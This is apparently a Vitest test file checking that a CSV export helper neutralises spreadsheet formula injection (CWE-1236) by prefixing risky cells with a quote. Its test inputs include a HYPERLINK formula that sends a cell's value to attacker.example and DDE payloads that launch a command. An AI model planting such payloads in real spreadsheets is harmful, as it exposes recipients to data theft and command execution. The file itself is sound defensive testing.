import { describe, it, expect } from 'vitest'
import { escapeCsvCell } from '@/app/api/clients/export/route'

describe('escapeCsvCell — CWE-1236 formula injection prevention', () => {
  it('leaves safe plain text unchanged', () => {
    expect(escapeCsvCell('Jane Smith')).toBe('Jane Smith')
  })

  it('leaves empty string unchanged', () => {
    expect(escapeCsvCell('')).toBe('')
  })

  it('handles null as empty string', () => {
    expect(escapeCsvCell(null)).toBe('')
  })

  it('handles undefined as empty string', () => {
    expect(escapeCsvCell(undefined)).toBe('')
  })

  it('leaves numeric string unchanged', () => {
    expect(escapeCsvCell('1234567890')).toBe('1234567890')
  })

  it('prefixes = formula with single-quote', () => {
    expect(escapeCsvCell('=SUM(A1:A10)')).toBe("'=SUM(A1:A10)")
  })

  it('prefixes + formula with single-quote', () => {
    expect(escapeCsvCell('+cmd|calc')).toBe("'+cmd|calc")
  })

  it('prefixes - formula with single-quote', () => {
    expect(escapeCsvCell('-2+3')).toBe("'-2+3")
  })

  it('prefixes @ formula with single-quote', () => {
    expect(escapeCsvCell('@SUM(1+1)')).toBe("'@SUM(1+1)")
  })

  it('prefixes tab-leading value with single-quote', () => {
    expect(escapeCsvCell('\t=hidden')).toBe("'\t=hidden")
  })

  it('prefixes CR-leading value with single-quote', () => {
    expect(escapeCsvCell('\r=hidden')).toBe("'\r=hidden")
  })

  it('does not alter value starting with letters', () => {
    expect(escapeCsvCell('referral')).toBe('referral')
  })

  it('handles HYPERLINK exfil pattern', () => {
    const evil = '=HYPERLINK("http://attacker.example/s?c="&A2,"Click")'
    expect(escapeCsvCell(evil)).toBe(`'${evil}`)
  })

  it('handles DDE attack pattern', () => {
    const dde = "=cmd|'/C calc'!A1"
    expect(escapeCsvCell(dde)).toBe(`'${dde}`)
  })

  it('converts numbers to string without prefix', () => {
    expect(escapeCsvCell(42)).toBe('42')
  })

  it('converts boolean to string without prefix', () => {
    expect(escapeCsvCell(true)).toBe('true')
  })
})
